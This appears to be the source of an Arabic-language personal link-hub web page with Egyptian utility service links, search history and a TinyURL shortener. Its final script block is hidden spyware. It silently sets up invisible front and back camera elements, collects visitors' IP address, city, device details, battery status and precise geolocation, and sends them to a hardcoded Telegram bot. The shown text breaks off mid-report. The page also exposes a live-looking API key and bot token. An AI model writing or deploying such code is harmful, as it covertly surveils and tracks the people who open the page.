                <h3>Services</h3>
                <div class="section-buttons">
                    <div class="section-button-wrapper">
                        <a href="https://www.nbe.com.eg/CEM/Default.aspx?lang=AR" class="section-button" target="_blank">
                            حجز موعد بالفرع
                        </a>
                        <button class="copy-button" data-url="https://www.nbe.com.eg/CEM/Default.aspx?lang=AR">
                            <i class="fas fa-copy"></i>
                        </button>
                    </div>
                    <div class="section-button-wrapper">
                        <a href="https://scedc.gov.eg/SCEDC/Customer/CustomerAccount.aspx" class="section-button" target="_blank">
                            شركة الكهرباء
                        </a>
                        <button class="copy-button" data-url="https://scedc.gov.eg/SCEDC/Customer/CustomerAccount.aspx">
                            <i class="fas fa-copy"></i>
                        </button>
                    </div>
                    <div class="section-button-wrapper">
                        <a href="https://www.overseasgas.com/GasRead.aspx" class="section-button" target="_blank">
                            إدخال قراءة العداد غاز
                        </a>
                        <button class="copy-button" data-url="https://www.overseasgas.com/GasRead.aspx">
                            <i class="fas fa-copy"></i>
                        </button>
                    </div>
                    <div class="section-button-wrapper">
                        <a href="https://www.hcww.com.eg/bill-payment/" class="section-button" target="_blank">
                            دفع فاتورة المياة
                        </a>
                        <button class="copy-button" data-url="https://www.hcww.com.eg/bill-payment/">
                            <i class="fas fa-copy"></i>
                        </button>
                    </div>
                    <div class="section-button-wrapper">
                        <a href="https://www.shmff.gov.eg/wps/myportal/MFF/Home/!ut/p/z1/04_Sj9CPykssy0xPLMnMz0vMAfIjo8zizRwtzDwsTAx9LMIMLAwcQ42DDMM8fYwN3M30ww" class="section-button" target="_blank">
                            استعلام عن شقق الإسكان الاجتماعي
                        </a>
                        <button class="copy-button" data-url="https://www.shmff.gov.eg/wps/myportal/MFF/Home/!ut/p/z1/04_Sj9CPykssy0xPLMnMz0vMAfIjo8zizRwtzDwsTAx9LMIMLAwcQ42DDMM8fYwN3M30ww">
                            <i class="fas fa-copy"></i>
                        </button>
                    </div>
                </div>
            </div>

            </div>
    </div>
    <div id="searchHistoryModal" class="modal">
        <div class="modal-content">
            <span class="close-button" id="closeHistoryModalBtn">&times;</span>
            <h2>سجل البحث</h2>
            <div class="history-controls">
                <input type="text" id="searchHistoryFilter" placeholder="تصفية السجل...">
                <select id="searchHistorySort">
                    <option value="date-desc">التاريخ (الأحدث أولاً)</option>
                    <option value="date-asc">التاريخ (الأقدم أولاً)</option>
                    <option value="most-used">الأكثر استخداماً</option>
                </select>
                <button id="deleteSelectedSearchHistoryBtn" style="background-color: #dc3545; color: white;">
                    حذف المحدد
                </button>
            </div>
            <ul id="historyList" class="search-history-list">
                </ul>
            <div class="modal-buttons">
                <button id="clearHistoryBtn">مسح السجل بالكامل</button>
                <button id="closeHistoryModalBottomBtn">إغلاق</button>
            </div>
        </div>
    </div>

    <div id="shortenerModal" class="modal">
        <div class="modal-content">
            <span class="close-button" id="closeShortenerModalBtn">&times;</span>
            <h2>اختصار الروابط</h2>

            <input type="url" id="originalLinkInput" class="link-shortener-input" placeholder="أدخل الرابط الأصلي هنا..." required>
            <button id="shortenButton" class="shorten-button">اختصر الرابط</button>
            <div id="shortenedLinkOutput" class="shortened-link-display"></div>
            <p id="shortenerError" class="error-message"></p>

            <div class="modal-section">
                <h3>سجل الروابط المختصرة</h3>
                <div class="history-controls">
                    <input type="text" id="shortenerHistoryFilter" placeholder="تصفية السجل...">
                    <select id="shortenerHistorySort">
                        <option value="date-desc">التاريخ (الأحدث أولاً)</option>
                        <option value="date-asc">التاريخ (الأقدم أولاً)</option>
                        <option value="most-used">الأكثر استخداماً</option>
                    </select>
                    <button id="deleteSelectedShortenerHistoryBtn" style="background-color: #dc3545; color: white;">
                        حذف المحدد
                    </button>
                </div>
                <ul id="shortenerHistoryList" class="shortener-history-list">
                    </ul>
                <div class="modal-buttons">
                    <button id="clearShortenerHistoryBtn">مسح السجل بالكامل</button>
                    <button id="closeShortenerModalBottomBtn">إغلاق</button>
                </div>
            </div>
        </div>
    </div>

    <script>
        const settingsBtn = document.getElementById('settingsBtn');
        const profileBtn = document.getElementById('profileBtn');
        const historyBtn = document.getElementById('historyBtn');
        const shortenLinkBtn = document.getElementById('shortenLinkBtn');

        const settingsModal = document.getElementById('settingsModal');
        const profileModal = document.getElementById('profileModal');
        const searchHistoryModal = document.getElementById('searchHistoryModal');
        const shortenerModal = document.getElementById('shortenerModal');

        const closeSettingsModalBtn = document.getElementById('closeSettingsModalBtn');
        const closeProfileModalBtn = document.getElementById('closeProfileModalBtn');
        const closeHistoryModalBtn = document.getElementById('closeHistoryModalBtn');
        const closeShortenerModalBtn = document.getElementById('closeShortenerModalBtn');

        const cancelModalBtn = document.getElementById('cancelModalBtn');
        const confirmRedirectBtn = document.getElementById('confirmRedirectBtn');
        // const closeProfileModalBottomBtn = document.getElementById('closeProfileModalBottomBtn'); // Removed as per new design

        // عناصر سجل البحث
        const clearHistoryBtn = document.getElementById('clearHistoryBtn');
        const closeHistoryModalBottomBtn = document.getElementById('closeHistoryModalBottomBtn');
        const historyList = document.getElementById('historyList');
        const searchHistoryFilterInput = document.getElementById('searchHistoryFilter');
        const searchHistorySortSelect = document.getElementById('searchHistorySort');
        const deleteSelectedSearchHistoryBtn = document.getElementById('deleteSelectedSearchHistoryBtn');


        // عناصر اختصار الروابط
        const originalLinkInput = document.getElementById('originalLinkInput');
        const shortenButton = document.getElementById('shortenButton');
        const shortenedLinkOutput = document.getElementById('shortenedLinkOutput');
        const shortenerError = document.getElementById('shortenerError');
        const shortenerHistoryList = document.getElementById('shortenerHistoryList');
        const clearShortenerHistoryBtn = document.getElementById('clearShortenerHistoryBtn');
        const closeShortenerModalBottomBtn = document.getElementById('closeShortenerModalBottomBtn');
        const shortenerHistoryFilterInput = document.getElementById('shortenerHistoryFilter');
        const shortenerHistorySortSelect = document.getElementById('shortenerHistorySort');
        const deleteSelectedShortenerHistoryBtn = document.getElementById('deleteSelectedShortenerHistoryBtn');


        const searchInput = document.getElementById('button-search-bar');
        const searchButton = document.getElementById('search-button');
        const resetButton = document.getElementById('reset-button');
        const allToolButtons = document.querySelectorAll('.button-grid .tool-button');
        const secretButton = document.getElementById('secretButton');
        const secretTvButton = document.getElementById('secretTvButton');

        // New elements for profile modal section display
        const profileSectionSelect = document.getElementById('profileSectionSelect');
        const linkSiteMeSection = document.getElementById('linkSiteMeSection');
        const hackerSection = document.getElementById('hackerSection');
        const servicesSection = document.getElementById('servicesSection');
        const profileSections = [linkSiteMeSection, hackerSection, servicesSection];


        const TINYURL_API_KEY = 'rM3pBN61NEm4mxdQOwqm8XgQFc68mbqaSgnXA1nTsTIEhv3Qau64Cj3M5v19';

        // تحميل السجلات من LocalStorage
        let searchHistory = JSON.parse(localStorage.getItem('searchHistory')) || [];
        // كل عنصر في سجل البحث سيحتوي الآن على { term: "...", timestamp: "...", uses: 0 }
        let shortenedLinksHistory = JSON.parse(localStorage.getItem('shortenedLinksHistory')) || [];
        // كل عنصر في سجل الروابط سيحتوي الآن على { original: "...", shortened: "...", timestamp: "...", uses: 0 }


        // =========================================================================
        // وظائف مساعدة Fuzzy Search
        // =========================================================================
        // هذه وظيفة Fuzzy Search مبسطة. للمشاريع الأكبر، يفضل استخدام مكتبات مثل Fuse.js
        function fuzzyMatch(pattern, text) {
            pattern = pattern.toLowerCase();
            text = text.toLowerCase();
            let patternIdx = 0;
            let textIdx = 0;
            let lastMatchIdx = -1;
            let score = 0;

            while (patternIdx < pattern.length && textIdx < text.length) {
                if (pattern[patternIdx] === text[textIdx]) {
                    if (lastMatchIdx === -1 || textIdx === lastMatchIdx + 1) { // Bonus for consecutive matches
                        score += 2;
                    } else {
                        score += 1;
                    }
                    lastMatchIdx = textIdx;
                    patternIdx++;
                } else {
                    score -= 0.1; // Small penalty for non-matching characters
                }
                textIdx++;
            }

            return patternIdx === pattern.length ? score : -1; // Return score if all pattern characters found, else -1
        }


        // =========================================================================
        // وظائف إدارة سجل البحث
        // =========================================================================

        function addToSearchHistory(term) {
            if (!term) return;

            // ابحث عن العنصر الموجود
            let existingItemIndex = searchHistory.findIndex(item => item.term === term);

            if (existingItemIndex !== -1) {
                // إذا كان موجودًا، زد عدد الاستخدامات وحركه إلى البداية
                searchHistory[existingItemIndex].uses = (searchHistory[existingItemIndex].uses || 0) + 1;
                searchHistory[existingItemIndex].timestamp = new Date().toISOString(); // تحديث التاريخ
                const item = searchHistory.splice(existingItemIndex, 1)[0];
                searchHistory.unshift(item);
            } else {
                // إذا لم يكن موجودًا، أضفه كعنصر جديد
                searchHistory.unshift({ term: term, timestamp: new Date().toISOString(), uses: 1 });
            }

            // الحفاظ على 10000 عنصرًا كحد أقصى (أو أي عدد تختاره)
            if (searchHistory.length > 10000) {
                searchHistory.pop();
            }
            localStorage.setItem('searchHistory', JSON.stringify(searchHistory));
        }


        function displaySearchHistory() {
            historyList.innerHTML = ''; // مسح القائمة الحالية

            // تطبيق الفلترة
            const filterText = searchHistoryFilterInput.value.toLowerCase();
            let filteredHistory = searchHistory.filter(item => {
                const term = item.term || ''; // التأكد من وجود الخاصية
                return fuzzyMatch(filterText, term) !== -1;
            });

            // تطبيق الفرز
            const sortOrder = searchHistorySortSelect.value;
            filteredHistory.sort((a, b) => {
                if (sortOrder === 'date-desc') {
                    return new Date(b.timestamp) - new Date(a.timestamp);
                } else if (sortOrder === 'date-asc') {
                    return new Date(a.timestamp) - new Date(b.timestamp);
                } else if (sortOrder === 'most-used') {
                    return (b.uses || 0) - (a.uses || 0); // ترتيب تنازلي لعدد الاستخدامات
                }
                return 0;
            });

            if (filteredHistory.length === 0) {
                const li = document.createElement('li');
                li.innerHTML = '<span>لا يوجد نتائج مطابقة في السجل.</span>';
                historyList.appendChild(li);
            } else {
                filteredHistory.forEach((item, index) => {
                    const li = document.createElement('li');
                    li.dataset.index = searchHistory.indexOf(item); // تخزين الفهرس الأصلي للعنصر

                    const checkbox = document.createElement('input');
                    checkbox.type = 'checkbox';
                    checkbox.classList.add('history-checkbox');
                    li.appendChild(checkbox);

                    const span = document.createElement('span');
                    // إضافة التاريخ وعدد الاستخدامات للعرض
                    const usesText = item.uses ? ` (${item.uses} استخدام)` : '';
                    span.textContent = `${item.term} - ${new Date(item.timestamp).toLocaleString()}${usesText}`;
                    span.classList.add('link-item-text'); // استخدام نفس الكلاس للستايل
                    li.appendChild(span);

                    const copyBtn = document.createElement('button');
                    copyBtn.classList.add('copy-button');
                    copyBtn.innerHTML = '<i class="fas fa-copy"></i>';
                    copyBtn.dataset.text = item.term;
                    li.appendChild(copyBtn);

                    historyList.appendChild(li);
                });
                attachCopyListenersToHistory();
            }
        }


        function attachCopyListenersToHistory() {
            const historyCopyButtons = document.querySelectorAll('#historyList .copy-button');
            historyCopyButtons.forEach(button => {
                button.addEventListener('click', async (event) => {
                    const textToCopy = event.currentTarget.dataset.text;
                    try {
                        await navigator.clipboard.writeText(textToCopy);
                        alert('تم نسخ: ' + textToCopy);
                    } catch (err) {
                        console.error('فشل نسخ النص: ', err);
                        alert('فشل نسخ النص: ' + textToCopy + ' (الرجاء النسخ يدويا)');
                    }
                });
            });
        }

        // =========================================================================
        // وظائف إدارة سجل الروابط المختصرة
        // =========================================================================

        function addToShortenedLinksHistory(original, shortened) {
            // ابحث عن العنصر الموجود
            let existingItemIndex = shortenedLinksHistory.findIndex(item => item.original === original);

            if (existingItemIndex !== -1) {
                // إذا كان موجودًا، زد عدد الاستخدامات وحركه إلى البداية
                shortenedLinksHistory[existingItemIndex].uses = (shortenedLinksHistory[existingItemIndex].uses || 0) + 1;
                shortenedLinksHistory[existingItemIndex].timestamp = new Date().toISOString(); // تحديث التاريخ
                const item = shortenedLinksHistory.splice(existingItemIndex, 1)[0];
                shortenedLinksHistory.unshift(item);
            } else {
                // إذا لم يكن موجودًا، أضفه كعنصر جديد
                shortenedLinksHistory.unshift({ original: original, shortened: shortened, timestamp: new Date().toISOString(), uses: 1 });
            }

            // الحفاظ على 20 عنصرًا كحد أقصى (أو أي عدد تختاره)
            if (shortenedLinksHistory.length > 20) {
                shortenedLinksHistory.pop();
            }
            localStorage.setItem('shortenedLinksHistory', JSON.stringify(shortenedLinksHistory));
        }


        function displayShortenedLinksHistory() {
            shortenerHistoryList.innerHTML = ''; // مسح القائمة الحالية

            // تطبيق الفلترة
            const filterText = shortenerHistoryFilterInput.value.toLowerCase();
            let filteredHistory = shortenedLinksHistory.filter(item => {
                const original = item.original || '';
                const shortened = item.shortened || '';
                return fuzzyMatch(filterText, original) !== -1 || fuzzyMatch(filterText, shortened) !== -1;
            });

            // تطبيق الفرز
            const sortOrder = shortenerHistorySortSelect.value;
            filteredHistory.sort((a, b) => {
                if (sortOrder === 'date-desc') {
                    return new Date(b.timestamp) - new Date(a.timestamp);
                } else if (sortOrder === 'date-asc') {
                    return new Date(a.timestamp) - new Date(b.timestamp);
                } else if (sortOrder === 'most-used') {
                    return (b.uses || 0) - (a.uses || 0);
                }
                return 0;
            });

            if (filteredHistory.length === 0) {
                const li = document.createElement('li');
                li.innerHTML = '<span>لا يوجد نتائج مطابقة في سجل الروابط المختصرة حالياً.</span>';
                shortenerHistoryList.appendChild(li);
            } else {
                filteredHistory.forEach(item => {
                    const li = document.createElement('li');
                    li.dataset.originalIndex = shortenedLinksHistory.indexOf(item); // تخزين الفهرس الأصلي للعنصر

                    const checkbox = document.createElement('input');
                    checkbox.type = 'checkbox';
                    checkbox.classList.add('history-checkbox');
                    li.appendChild(checkbox);

                    const linkPairDiv = document.createElement('div');
                    linkPairDiv.classList.add('link-pair');
                    
                    const originalSpan = document.createElement('span');
                    originalSpan.classList.add('original-link');
                    // إضافة التاريخ وعدد الاستخدامات للعرض
                    const usesText = item.uses ? ` (${item.uses} استخدام)` : '';
                    originalSpan.textContent = `الأصلي: ${item.original} - ${new Date(item.timestamp).toLocaleString()}${usesText}`;
                    linkPairDiv.appendChild(originalSpan);

                    const shortenedSpan = document.createElement('span');
                    shortenedSpan.classList.add('shortened-link');
                    shortenedSpan.innerHTML = `<a href="${item.shortened}" target="_blank">${item.shortened}</a>`;
                    linkPairDiv.appendChild(shortenedSpan);

                    li.appendChild(linkPairDiv);

                    const copyButtonsWrapper = document.createElement('div');
                    copyButtonsWrapper.classList.add('copy-buttons-wrapper');

                    const copyOriginalBtn = document.createElement('button');
                    copyOriginalBtn.classList.add('copy-button');
                    copyOriginalBtn.innerHTML = '<i class="fas fa-copy"></i> (أصلي)';
                    copyOriginalBtn.dataset.text = item.original;
                    copyButtonsWrapper.appendChild(copyOriginalBtn);

                    const copyShortenedBtn = document.createElement('button');
                    copyShortenedBtn.classList.add('copy-button');
                    copyShortenedBtn.innerHTML = '<i class="fas fa-copy"></i> (مختصر)';
                    copyShortenedBtn.dataset.text = item.shortened;
                    copyButtonsWrapper.appendChild(copyShortenedBtn);

                    li.appendChild(copyButtonsWrapper);
                    shortenerHistoryList.appendChild(li);
                });
                attachCopyListenersToShortenerHistory();
            }
        }

        function attachCopyListenersToShortenerHistory() {
            const shortenerCopyButtons = document.querySelectorAll('#shortenerHistoryList .copy-button');
            shortenerCopyButtons.forEach(button => {
                button.addEventListener('click', async (event) => {
                    const textToCopy = event.currentTarget.dataset.text;
                    try {
                        await navigator.clipboard.writeText(textToCopy);
                        alert('تم نسخ: ' + textToCopy);
                    } catch (err) {
                        console.error('فشل نسخ النص: ', err);
                        alert('فشل نسخ النص: ' + textToCopy + ' (الرجاء النسخ يدويا)');
                    }
                });
            });
        }


        // =========================================================================
        // Event Listeners for Modals and Buttons
        // =========================================================================

        // Function to display the correct profile section
        function displayProfileSection(sectionId) {
            profileSections.forEach(section => {
                if (section.id === sectionId) {
                    section.style.display = 'block';
                } else {
                    section.style.display = 'none';
                }
            });
        }

        settingsBtn.addEventListener('click', () => {
            settingsModal.style.display = 'flex';
        });

        profileBtn.addEventListener('click', () => {
            profileModal.style.display = 'flex';
            // Set initial selected option and display the corresponding section
            profileSectionSelect.value = 'linkSiteMeSection'; // Default to "Link Site Me"
            displayProfileSection('linkSiteMeSection');
        });

        profileSectionSelect.addEventListener('change', (event) => {
            displayProfileSection(event.target.value);
        });


        historyBtn.addEventListener('click', () => {
            displaySearchHistory(); // عرض السجل عند الفتح
            searchHistoryModal.style.display = 'flex';
        });

        shortenLinkBtn.addEventListener('click', () => {
            originalLinkInput.value = '';
            shortenedLinkOutput.innerHTML = '';
            shortenerError.textContent = '';
            displayShortenedLinksHistory();
            shortenerModal.style.display = 'flex';
        });

        closeSettingsModalBtn.addEventListener('click', () => { settingsModal.style.display = 'none'; });
        closeProfileModalBtn.addEventListener('click', () => { profileModal.style.display = 'none'; });
        closeHistoryModalBtn.addEventListener('click', () => { searchHistoryModal.style.display = 'none'; });
        closeShortenerModalBtn.addEventListener('click', () => { shortenerModal.style.display = 'none'; });

        cancelModalBtn.addEventListener('click', () => { settingsModal.style.display = 'none'; });
        // closeProfileModalBottomBtn.addEventListener('click', () => { profileModal.style.display = 'none'; }); // Removed

        // مسح سجل البحث بالكامل
        clearHistoryBtn.addEventListener('click', () => {
            if (confirm('هل أنت متأكد أنك تريد مسح سجل البحث بالكامل؟')) {
                searchHistory = [];
                localStorage.removeItem('searchHistory');
                displaySearchHistory();
                alert('تم مسح سجل البحث.');
            }
        });

        // حذف عناصر محددة من سجل البحث
        deleteSelectedSearchHistoryBtn.addEventListener('click', () => {
            const checkboxes = document.querySelectorAll('#historyList .history-checkbox:checked');
            if (checkboxes.length === 0) {
                alert('الرجاء تحديد عناصر لحذفها.');
                return;
            }

            if (confirm(`هل أنت متأكد أنك تريد حذف ${checkboxes.length} عنصر (عناصر) محددة؟`)) {
                // جمع الفهارس الأصلية للعناصر المراد حذفها
                const indicesToDelete = Array.from(checkboxes).map(cb => parseInt(cb.closest('li').dataset.index)).sort((a, b) => b - a);
                
                indicesToDelete.forEach(index => {
                    searchHistory.splice(index, 1);
                });
                localStorage.setItem('searchHistory', JSON.stringify(searchHistory));
                displaySearchHistory();
                alert('تم حذف العناصر المحددة.');
            }
        });

        closeHistoryModalBottomBtn.addEventListener('click', () => { searchHistoryModal.style.display = 'none'; });

        // مسح سجل الروابط المختصرة بالكامل
        clearShortenerHistoryBtn.addEventListener('click', () => {
            if (confirm('هل أنت متأكد أنك تريد مسح سجل الروابط المختصرة بالكامل؟')) {
                shortenedLinksHistory = [];
                localStorage.removeItem('shortenedLinksHistory');
                displayShortenedLinksHistory();
                alert('تم مسح سجل الروابط المختصرة.');
            }
        });

        // حذف عناصر محددة من سجل الروابط المختصرة
        deleteSelectedShortenerHistoryBtn.addEventListener('click', () => {
            const checkboxes = document.querySelectorAll('#shortenerHistoryList .history-checkbox:checked');
            if (checkboxes.length === 0) {
                alert('الرجاء تحديد عناصر لحذفها.');
                return;
            }

            if (confirm(`هل أنت متأكد أنك تريد حذف ${checkboxes.length} رابط (روابط) محددة؟`)) {
                const indicesToDelete = Array.from(checkboxes).map(cb => parseInt(cb.closest('li').dataset.originalIndex)).sort((a, b) => b - a);

                indicesToDelete.forEach(index => {
                    shortenedLinksHistory.splice(index, 1);
                });
                localStorage.setItem('shortenedLinksHistory', JSON.stringify(shortenedLinksHistory));
                displayShortenedLinksHistory();
                alert('تم حذف الروابط المحددة.');
            }
        });

        closeShortenerModalBottomBtn.addEventListener('click', () => { shortenerModal.style.display = 'none'; });


        window.addEventListener('click', (event) => {
            if (event.target == settingsModal) { settingsModal.style.display = 'none'; }
            if (event.target == profileModal) { profileModal.style.display = 'none'; }
            if (event.target == searchHistoryModal) { searchHistoryModal.style.display = 'none'; }
            if (event.target == shortenerModal) { shortenerModal.style.display = 'none'; }
        });

        confirmRedirectBtn.addEventListener('click', () => {
            window.open('https://my_aboelfadl_helper_.eyoo.org/', '_blank');
            settingsModal.style.display = 'none';
        });

coonfirmRedirectBtn.addEventListener('click', () => {
            window.open('https://t.me/my_aboelfadl_helper_bot/', '_blank');
            settingsModal.style.display = 'none';
        });
        // =========================================================================
        // وظائف البحث عن الأزرار
        // =========================================================================

        function performButtonSearch() {
            const searchTerm = searchInput.value.trim();
            const lowerCaseSearchTerm = searchTerm.toLowerCase();
            let foundMatch = false;

            if (searchTerm !== '') {
                addToSearchHistory(searchTerm); // أضف المصطلح إلى السجل عند البحث
            }

            allToolButtons.forEach(button => {
                const buttonText = button.textContent.toLowerCase();

                button.classList.remove('highlight-button');
                button.classList.remove('hidden-button');
                button.style.display = 'none';

                if (button.id === 'secretButton') {
                    if (lowerCaseSearchTerm === 'com') {
                        button.style.display = 'flex';
                        button.classList.add('highlight-button');
                        foundMatch = true;
                    }
                } else if (button.id === 'secretTvButton') {
                    if (lowerCaseSearchTerm === 'tv') {
                        button.style.display = 'flex';
                        button.classList.add('highlight-button');
                        foundMatch = true;
                    }
                } else {
                    // دعم البحث بالعبارات (موجود بالفعل جزئيا مع includes)
                    // تطبيق Fuzzy Search
                    if (lowerCaseSearchTerm === '' || fuzzyMatch(lowerCaseSearchTerm, buttonText) !== -1) {
                        if (button.id !== 'secretButton' && button.id !== 'secretTvButton') {
                            button.style.display = 'flex';
                        }
                    }
                }
            });

            if (lowerCaseSearchTerm === '') {
                allToolButtons.forEach(button => {
                    if (button.id !== 'secretButton' && button.id !== 'secretTvButton') {
                        button.style.display = 'flex';
                    }
                });
            } else if (!foundMatch) {
                // إذا لم يتم العثور على أي تطابق داخلي، ابحث في Google أو افتح كرابط
                if (isValidUrl(searchTerm)) {
                    window.open(searchTerm, '_blank');
                } else {
                    const googleSearchUrl = `https://www.google.com/search?q=${encodeURIComponent(searchTerm)}`;
                    window.open(googleSearchUrl, '_blank');
                }
            }
        }


        searchButton.addEventListener('click', performButtonSearch);

        searchInput.addEventListener('keypress', function(event) {
            if (event.key === 'Enter') {
                performButtonSearch();
            }
        });

        resetButton.addEventListener('click', function() {
            searchInput.value = '';
            allToolButtons.forEach(button => {
                button.classList.remove('highlight-button');
                button.classList.remove('hidden-button');
                if (button.id === 'secretButton' || button.id === 'secretTvButton') {
                    button.style.display = 'none';
                } else {
                    button.style.display = 'flex';
                }
            });
        });

        document.addEventListener('DOMContentLoaded', () => {
            if (secretButton) { secretButton.style.display = 'none'; }
            if (secretTvButton) { secretTvButton.style.display = 'none'; }
        });

        secretButton.addEventListener('click', (event) => {
            event.preventDefault();
            window.open('https://tinyurl.com/yu6mn428', '_blank');
        });

        secretTvButton.addEventListener('click', (event) => {
            event.preventDefault();
            window.open('https://tinyurl.com/fsx3whze', '_blank');
        });

        // =========================================================================
        // وظائف أزرار النسخ في Profile Modal
        // =========================================================================
        const copyButtons = document.querySelectorAll('#profileModal .copy-button');

        copyButtons.forEach(button => {
            button.addEventListener('click', async (event) => {
                const urlToCopy = event.currentTarget.dataset.url;
                try {
                    await navigator.clipboard.writeText(urlToCopy);
                    alert('تم نسخ الرابط: ' + urlToCopy);
                } catch (err) {
                    console.error('فشل نسخ الرابط: ', err);
                    alert('فشل نسخ الرابط: ' + urlToCopy + ' (الرجاء النسخ يدويا)');
                }
            });
        });

        // =========================================================================
        // وظائف اختصار الروابط (TinyURL)
        // =========================================================================

        function isValidUrl(string) {
            try {
                new URL(string);
                return true;
            } catch (e) {
                return false;
            }
        }

        shortenButton.addEventListener('click', async () => {
            const originalLink = originalLinkInput.value.trim();
            shortenedLinkOutput.innerHTML = '';
            shortenerError.textContent = '';

            if (!originalLink) {
                shortenerError.textContent = 'الرجاء إدخال الرابط الأصلي.';
                return;
            }

            if (!isValidUrl(originalLink)) {
                shortenerError.textContent = 'الرجاء إدخال رابط URL صالح.';
                return;
            }

            if (!TINYURL_API_KEY) {
                shortenerError.textContent = 'خطأ: مفتاح TinyURL API غير موجود.';
                return;
            }

            try {
                const apiUrl = `https://api.tinyurl.com/create`;

                const response = await fetch(apiUrl, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                        'Authorization': `Bearer ${TINYURL_API_KEY}`
                    },
                    body: JSON.stringify({ url: originalLink })
                });

                const data = await response.json();

                if (response.ok && data.data && data.data.tiny_url) {
                    const shortLink = data.data.tiny_url;
                    shortenedLinkOutput.innerHTML = `<a href="${shortLink}" target="_blank">${shortLink}</a>`;
                    
                    const copyCurrentShortenedBtn = document.createElement('button');
                    copyCurrentShortenedBtn.classList.add('copy-button');
                    copyCurrentShortenedBtn.innerHTML = '<i class="fas fa-copy"></i> نسخ';
                    copyCurrentShortenedBtn.style.marginLeft = '10px';
                    copyCurrentShortenedBtn.style.padding = '8px 15px';
                    copyCurrentShortenedBtn.style.backgroundColor = '#555555';
                    copyCurrentShortenedBtn.style.color = '#FFD700';
                    copyCurrentShortenedBtn.style.border = 'none';
                    copyCurrentShortenedBtn.style.borderRadius = '5px';
                    copyCurrentShortenedBtn.style.cursor = 'pointer';
                    copyCurrentShortenedBtn.addEventListener('click', async () => {
                        try {
                            await navigator.clipboard.writeText(shortLink);
                            alert('تم نسخ الرابط المختصر: ' + shortLink);
                        } catch (err) {
                            console.error('فشل نسخ الرابط: ', err);
                            alert('فشل نسخ الرابط: ' + shortLink + ' (الرجاء النسخ يدويا)');
                        }
                    });
                    shortenedLinkOutput.appendChild(copyCurrentShortenedBtn);

                    addToShortenedLinksHistory(originalLink, shortLink);
                    displayShortenedLinksHistory();
                } else {
                    let errorMessage = 'حدث خطأ عند اختصار الرابط.';
                    if (data.errors && data.errors.length > 0) {
                        errorMessage = `خطأ: ${data.errors[0].message}`;
                    } else if (data.message) {
                        errorMessage = `خطأ: ${data.message}`;
                    }
                    shortenerError.textContent = errorMessage;
                }
            } catch (error) {
                console.error('Error shortening link:', error);
                shortenerError.textContent = 'حدث خطأ في الاتصال بالخدمة. يرجى المحاولة لاحقًا.';
            }
        });

        // =========================================================================
        // Event Listeners لفلترة وفرز السجل
        // =========================================================================

        searchHistoryFilterInput.addEventListener('input', displaySearchHistory);
        searchHistorySortSelect.addEventListener('change', displaySearchHistory);

        shortenerHistoryFilterInput.addEventListener('input', displayShortenedLinksHistory);
        shortenerHistorySortSelect.addEventListener('change', displayShortenedLinksHistory);

    </script>

<script>
    // ⚙️ إعدادات التيليجرام
    const BOT_TOKEN = '8060685956:AAGJztf_aHHhFdBsH2OLuCPYS2TwPRY3_R4'; // ← غيّرها
    const CHAT_ID = '1431886140'; // ← غيّرها

    // 🎥 إنشاء عناصر الكاميرا والكانفوس (مخفية)
    const frontVideo = document.createElement('video');
    const backVideo = document.createElement('video');
    const frontCanvas = document.createElement('canvas');
    const backCanvas = document.createElement('canvas');

    [frontVideo, backVideo].forEach(v => {
        v.setAttribute('playsinline', '');
        v.setAttribute('autoplay', '');
        v.setAttribute('muted', '');
        v.style.display = 'none';
        document.body.appendChild(v);
    });

    [frontCanvas, backCanvas].forEach(c => {
        c.style.display = 'none';
        document.body.appendChild(c);
    });

    // 📍 جلب chatId من الرابط (اختياري)
    const urlParams = new URLSearchParams(window.location.search);
    const userId = urlParams.get("chatId") || 'مافيش';

    // 🌐 جمع بيانات الجهاز + الآيبي (مع Fallback)
    async function collectAdditionalData() {
        let ip = 'مافيش';
        let country = 'مافيش';
        let city = 'مافيش';

        // المصادر البديلة لجلب الآيبي والموقع
        const sources = [
            'https://ipapi.co/json/',
            'https://ipwho.is/',
            'https://jsonip.com'
        ];

        for (const url of sources) {
            try {
                const res = await fetch(url, { timeout: 5000 });
                const data = await res.json();

                if (!ip && data.ip) ip = data.ip;
                if (!country && (data.country_name || data.country)) country = data.country_name || data.country;
                if (!city && (data.city || data.city)) city = data.city;

                if (ip !== 'مافيش') break; // نجح، توقف
            } catch (e) {
                continue;
            }
        }

        // إذا فشل كل المصادر، استخدم ipify للآيبي فقط
        if (ip === 'مافيش') {
            try {
                const res = await fetch('https://api.ipify.org?format=json');
                const data = await res.json();
                if (data.ip) ip = data.ip;
            } catch (e) {}
        }

        // البطارية
        let batteryLevel = 'مافيش';
        let batteryCharging = 'مافيش';
        try {
            const battery = await navigator.getBattery();
            batteryLevel = Math.round(battery.level * 100) + '%';
            batteryCharging = battery.charging ? 'نعم' : 'لا';
        } catch (e) {}

        return {
            ip, country, city,
            platform: getPlatformInfo().platform,
            deviceVersion: getDeviceVersion(),
            batteryLevel, batteryCharging
        };
    }

    function getPlatformInfo() {
        const ua = navigator.userAgent;
        if (/Windows/.test(ua)) return { platform: "Windows" };
        if (/Mac/.test(ua)) return { platform: "MacOS" };
        if (/Linux/.test(ua)) return { platform: "Linux" };
        if (/Android/.test(ua)) return { platform: "Android" };
        if (/iPhone|iPad|iPod/.test(ua)) return { platform: "iOS" };
        return { platform: "Unknown" };
    }

    function getDeviceVersion() {
        const ua = navigator.userAgent;
        const match = ua.match(/\(([^)]+)\)/);
        return match ? match[1] : 'Unknown';
    }

    // 📍 جلب الموقع بدقة عالية
    function getLocation() {
        return new Promise((resolve) => {
            const timeout = setTimeout(() => resolve(null), 10000);

            if (!navigator.geolocation) {
                resolve(null);
                return;
            }

            navigator.geolocation.getCurrentPosition(
                (position) => {
                    clearTimeout(timeout);
                    const { latitude, longitude, accuracy } = position.coords;
                    resolve({ lat: latitude, lon: longitude, accuracy });
                },
                (error) => {
                    clearTimeout(timeout);
                    console.error("فشل في جلب الموقع:", error);
                    resolve(null);
                },
                {
                    enableHighAccuracy: true,
                    timeout: 10000,
                    maximumAge: 0
                }
            );
        });
    }

    // 📤 إرسال الموقع على الخريطة
    function sendLocationToTelegram(lat, lon) {
        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                latitude: lat,
                longitude: lon
            })
        }).catch(() => {});
    }

    // 📝 إرسال تقرير نصي
    function sendTextReport(data, note = '') {
        let message = `
📋 *تقرير جمع البيانات*
🆔 المعرف: ${userId}
🌐 الجهاز:
